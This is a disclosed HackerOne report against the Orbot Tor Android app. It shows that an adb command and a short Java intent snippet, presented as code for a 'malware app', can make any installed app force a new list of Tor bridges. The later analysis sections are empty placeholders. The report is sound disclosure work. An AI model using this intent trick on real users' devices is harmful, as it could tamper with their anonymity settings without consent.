---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '252626'
original_report_id: '252626'
title: '[Android org.torproject.android] Possible to force list of bridges'
weakness: Forced Browsing
team_handle: torproject
created_at: '2017-07-22T20:32:06.453Z'
disclosed_at: '2017-08-21T19:11:41.303Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 11
tags:
- hackerone
- forced-browsing
---

# [Android org.torproject.android] Possible to force list of bridges

## Metadata

- HackerOne Report ID: 252626
- Weakness: Forced Browsing
- Program: torproject
- Disclosed At: 2017-08-21T19:11:41.303Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Do the following thing from ADB to emulate the activity start:
```
adb am start -n org.torproject.android/.OrbotMainActivity -a android.intent.action.VIEW -d bridge://xxx
```

Or create a malware app with the following code:
```java
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("org.torproject.android", "org.torproject.android.OrbotMainActivity");
        intent.setData(Uri.parse("bridge://xxx"));
        startActivity(intent);
```

And new list of bridges will be applied (notification will be shown and new value will be added to shared_prefs).

It's dangerous because any not authorized app (third party app) installed on the same device will be able to modify settings. On the newest Android devices this not authozed change can be done remotely from any web-browser using Instant Apps (app that doesn't require install to execute any code).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
